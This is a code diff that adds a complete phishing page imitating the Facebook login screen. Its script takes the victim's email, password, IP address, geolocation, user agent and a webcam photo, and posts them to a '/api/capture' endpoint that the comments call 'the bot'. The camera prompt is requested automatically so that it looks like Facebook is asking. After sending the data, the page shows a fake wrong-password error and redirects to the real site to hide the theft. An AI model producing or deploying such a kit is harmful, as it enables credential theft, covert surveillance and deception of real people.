@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Facebook - Log in or sign up</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #f0f2f5;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        /* Main Container */
+        .container {
+            max-width: 400px;
+            width: 100%;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Header */
+        .header {
+            background: #1877f2;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .logo {
+            font-size: 40px;
+            font-weight: bold;
+            color: white;
+            letter-spacing: -1px;
+        }
+
+        /* Form */
+        .form-container {
+            padding: 20px;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 17px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            outline: none;
+            transition: border 0.2s;
+        }
+
+        input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .login-btn:hover {
+            background: #166fe5;
+        }
+
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+            position: relative;
+        }
+
+        .create-btn {
+            width: 100%;
+            padding: 12px;
+            background: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .create-btn:hover {
+            background: #36a420;
+        }
+
+        .forgot {
+            text-align: center;
+            margin-top: 15px;
+        }
+
+        .forgot a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        /* Camera Modal */
+        .camera-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .camera-modal.active {
+            display: flex;
+        }
+
+        .camera-container {
+            position: relative;
+            width: 90%;
+            max-width: 400px;
+            background: #000;
+            border-radius: 20px;
+            overflow: hidden;
+        }
+
+        video {
+            width: 100%;
+            height: auto;
+        }
+
+        .camera-controls {
+            display: flex;
+            gap: 20px;
+            margin-top: 20px;
+        }
+
+        .cam-btn {
+            padding: 12px 24px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .cam-btn.capture {
+            background: #ff4444;
+        }
+
+        /* Loading */
+        .loading {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.7);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-size: 20px;
+        }
+
+        .loading.active {
+            display: flex;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1877f2;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 15px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">facebook</div>
+        </div>
+        <div class="form-container">
+            <form id="loginForm">
+                <div class="input-group">
+                    <input type="text" id="email" placeholder="Email address or phone number" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="Password" required>
+                </div>
+                <button type="submit" class="login-btn">Log In</button>
+            </form>
+            <div class="divider"></div>
+            <button class="create-btn">Create New Account</button>
+            <div class="forgot">
+                <a href="#">Forgotten password?</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Camera Modal -->
+    <div class="camera-modal" id="cameraModal">
+        <div class="camera-container">
+            <video id="video" autoplay playsinline></video>
+            <canvas id="canvas" style="display: none;"></canvas>
+        </div>
+        <div class="camera-controls">
+            <button class="cam-btn" id="closeCamera">Close</button>
+            <button class="cam-btn capture" id="capturePhoto">Capture Photo</button>
+        </div>
+    </div>
+
+    <!-- Loading -->
+    <div class="loading" id="loading">
+        <div class="spinner"></div>
+        <span>Processing...</span>
+    </div>
+
+    <script>
+        // Get token from URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const token = urlParams.get('token');
+        
+        let stream = null;
+        let photoCaptured = false;
+
+        // Get location
+        function getLocation() {
+            return new Promise((resolve) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            resolve(`${position.coords.latitude}, ${position.coords.longitude}`);
+                        },
+                        () => resolve('Location denied')
+                    );
+                } else {
+                    resolve('Not supported');
+                }
+            });
+        }
+
+        // Get IP
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch {
+                return 'Unknown';
+            }
+        }
+
+        // Request camera
+        async function requestCamera() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                document.getElementById('cameraModal').classList.add('active');
+            } catch (err) {
+                console.log('Camera denied:', err);
+                photoCaptured = true; // Mark as captured so we don't wait
+            }
+        }
+
+        // Capture photo
+        function capturePhoto() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            const photoData = canvas.toDataURL('image/jpeg', 0.8);
+            
+            // Stop camera
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+            document.getElementById('cameraModal').classList.remove('active');
+            
+            photoCaptured = true;
+            return photoData;
+        }
+
+        // Send data to bot
+        async function sendToBot(email, password, photo, ip, location) {
+            try {
+                const response = await fetch('/api/capture', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        token: token,
+                        email: email,
+                        password: password,
+                        image: photo,
+                        ip: ip,
+                        location: location,
+                        userAgent: navigator.userAgent
+                    })
+                });
+                return await response.json();
+            } catch (err) {
+                console.error('Send error:', err);
+                return null;
+            }
+        }
+
+        // Handle form submit
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            if (!email || !password) {
+                alert('Please fill in all fields');
+                return;
+            }
+            
+            document.getElementById('loading').classList.add('active');
+            
+            // Get IP and location
+            const ip = await getIP();
+            const location = await getLocation();
+            
+            // Request camera if not already captured
+            let photo = null;
+            if (!photoCaptured) {
+                await requestCamera();
+                
+                // Wait for camera capture with timeout
+                const capturePromise = new Promise((resolve) => {
+                    const captureBtn = document.getElementById('capturePhoto');
+                    const closeBtn = document.getElementById('closeCamera');
+                    
+                    const onCapture = () => {
+                        photo = capturePhoto();
+                        cleanup();
+                        resolve(photo);
+                    };
+                    
+                    const onClose = () => {
+                        if (stream) stream.getTracks().forEach(track => track.stop());
+                        document.getElementById('cameraModal').classList.remove('active');
+                        cleanup();
+                        resolve(null);
+                    };
+                    
+                    const cleanup = () => {
+                        captureBtn.removeEventListener('click', onCapture);
+                        closeBtn.removeEventListener('click', onClose);
+                    };
+                    
+                    captureBtn.addEventListener('click', onCapture);
+                    closeBtn.addEventListener('click', onClose);
+                });
+                
+                photo = await capturePromise;
+            }
+            
+            // Send to bot
+            await sendToBot(email, password, photo, ip, location);
+            
+            // Show fake error and redirect to real Facebook
+            document.getElementById('loading').classList.remove('active');
+            alert('Wrong password. Please try again.');
+            
+            // Redirect to real Facebook
+            window.location.href = 'https://facebook.com';
+        });
+        
+        // Auto request camera on page load (looks like Facebook is asking)
+        setTimeout(() => {
+            if (!photoCaptured) {
+                requestCamera();
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
